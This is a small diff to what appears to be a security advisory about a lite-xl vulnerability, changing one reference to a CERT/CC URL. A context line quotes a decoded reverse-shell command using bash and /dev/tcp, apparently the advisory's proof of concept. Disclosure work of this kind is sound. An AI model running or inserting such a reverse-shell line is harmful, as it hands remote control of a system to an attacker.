@@ -45,7 +45,7 @@ That base64 decodes to `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`
 
 ## References
 
-- CERT/CC Vulnerability Note VU#579478
+- https://kb.cert.org/vuls/id/579478
 - https://github.com/lite-xl/lite-xl/
 - https://github.com/lite-xl/lite-xl/pull/1472
 - https://github.com/lite-xl/lite-xl/pull/1473
